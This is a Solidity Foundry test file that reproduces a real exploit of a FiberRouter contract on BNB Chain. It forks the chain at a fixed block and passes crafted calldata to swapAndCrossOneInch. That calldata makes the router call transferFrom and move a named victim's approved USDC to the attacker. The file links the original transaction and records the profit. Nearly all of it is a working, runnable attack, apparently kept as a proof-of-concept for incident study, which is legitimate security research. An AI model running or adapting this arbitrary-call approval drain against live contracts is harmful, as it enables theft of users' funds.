// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX::https://app.blocksec.com/explorer/tx/bsc/0x7260ad0e4769ae68f0a680356c63140353c18d7be1b86a8c4e99a0fc3b6842c1
// GUY : https://x.com/MetaSec_xyz/status/1729323254610002277
// Profit : ~59 USDC
interface FiberRouter{
   function swapAndCrossOneInch(
        address swapRouter,
        uint256 amountIn,
        uint256 amountCrossMin, // amountOutMin on uniswap
        uint256 crossTargetNetwork,
        address crossTargetToken,
        address crossTargetAddress,
        uint256 swapBridgeAmount,
        bytes memory _calldata,
        address fromToken,
        address foundryToken
    ) external;
}

contract ContractTest is Test {
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    FiberRouter fiberrouter=FiberRouter(0x4826e896E39DC96A8504588D21e9D44750435e2D);
    address victim=0x4da35bf35504D77e5C5E9Db6a35B76eB4479306a;
    IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    address crossToken=0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;

    event log_Data(bytes data);

    function setUp() external {
        cheats.createSelectFork("bsc", 33874498);
        deal(address(wbnb), address(this), 1 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDC before exploit", usdc.balanceOf(address(this)), 18);
        attack();
        emit log_named_decimal_uint("[End] Attacker USDC after exploit", usdc.balanceOf(address(this)), 18);
    }

    function attack() public {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", usdc.balanceOf(address(victim)), 18);
        uint256 victim_balance=usdc.balanceOf(address(victim));
        wbnb.approve(address(pancakeRouter),99999 ether);
        address[] memory swapPath = new address[](2);
        swapPath[0] = address(wbnb);
        swapPath[1] = address(usdc);
        pancakeRouter.swapExactETHForTokens{value: 0.0000001 ether}(1, swapPath, address(fiberrouter), block.timestamp+20);
        bytes memory datas=abi.encodePacked(abi.encodeWithSignature("transferFrom(address,address,uint256)", address(victim),address(this),victim_balance));
        emit log_Data(datas);
        fiberrouter.swapAndCrossOneInch(address(usdc), 0, 1, 43114, address(crossToken), address(crossToken), 0, datas, address(usdc), address(usdc));
    
    }
}
